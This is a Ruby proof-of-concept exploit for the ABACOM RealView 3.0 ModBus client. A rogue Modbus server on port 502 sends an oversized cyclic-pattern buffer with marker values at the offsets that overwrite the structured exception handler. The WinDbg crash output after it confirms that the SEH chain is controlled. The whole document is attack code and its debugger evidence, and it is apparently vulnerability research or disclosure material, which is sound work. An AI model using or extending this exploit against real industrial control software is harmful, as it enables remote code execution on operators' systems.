#!/usr/bin/env ruby
# ABACOM RealView 3.0 ModBus Client
require 'rex'

buff = Rex::Text.pattern_create(9024)
buff[296, 4] = [0xfeedface].pack('V')
buff[300, 4] = [0xdeadbeef].pack('V')

server = TCPServer.new 502

loop do
  client = server.accept
  select(nil,nil,nil,0)
  client.write(buff + "\r\n")
end
__END__
884.ee4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0298fd9a ebx=029c4090 ecx=fffff2de edx=00130d22 esi=00002342 edi=0012e9e8
eip=0040311b esp=0012e9a4 ebp=0012e9dc iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210286
RealView30+0x311b:
0040311b df3c11          fistp   qword ptr [ecx+edx] ds:0023:00130000=0000002078746341
0:000> !exchain
0012e9c0: RealView30+2105eb (006105eb)
0012eb10: deadbeef
Invalid exception stack at feedface
0:000> kv
ChildEBP RetAddr  Args to Child              
WARNING: Stack unwind information not available. Following frames may be wrong.
0012e9dc 006116cd 00000001 01010600 01000000 RealView30+0x311b
0012eb44 6c41376c 396c4138 41306d41 6d41316d RealView30+0x2116cd
0012eb48 396c4138 41306d41 6d41316d 336d4132 0x6c41376c
0012eb4c 41306d41 6d41316d 336d4132 41346d41 0x396c4138
0012eb50 6d41316d 336d4132 41346d41 6d41356d 0x41306d41
0012eb54 336d4132 41346d41 6d41356d 376d4136 0x6d41316d
0012eb58 41346d41 6d41356d 376d4136 41386d41 0x336d4132
0012eb5c 6d41356d 376d4136 41386d41 6e41396d 0x41346d41
0012eb60 376d4136 41386d41 6e41396d 316e4130 0x6d41356d
0012eb64 41386d41 6e41396d 316e4130 41326e41 0x376d4136
0012eb68 6e41396d 316e4130 41326e41 6e41336e 0x41386d41
0012eb6c 316e4130 41326e41 6e41336e 356e4134 0x6e41396d
0012eb70 41326e41 6e41336e 356e4134 41366e41 0x316e4130
0012eb74 6e41336e 356e4134 41366e41 6e41376e 0x41326e41
0012eb78 356e4134 41366e41 6e41376e 396e4138 0x6e41336e
0012eb7c 41366e41 6e41376e 396e4138 41306f41 0x356e4134
0012eb80 6e41376e 396e4138 41306f41 6f41316f 0x41366e41
0012eb84 396e4138 41306f41 6f41316f 336f4132 0x6e41376e
0012eb88 41306f41 6f41316f 336f4132 41346f41 0x396e4138
0012eb8c 6f41316f 336f4132 41346f41 6f41356f 0x41306f41
0:000> lmvm RealView30
start    end        module name
00400000 00742000   RealView30 C (no symbols)           
    Loaded symbol image file: C:\Program Files\RealView30 (Demo)\RealView30.exe
    Image path: C:\Program Files\RealView30 (Demo)\RealView30.exe
    Image name: RealView30.exe
    Timestamp:        Fri Jun 19 16:22:17 1992 (2A425E19)
    CheckSum:         00000000
    ImageSize:        00342000
    Translations:     0000.04b0 0000.04e0 0409.04b0 0409.04e0

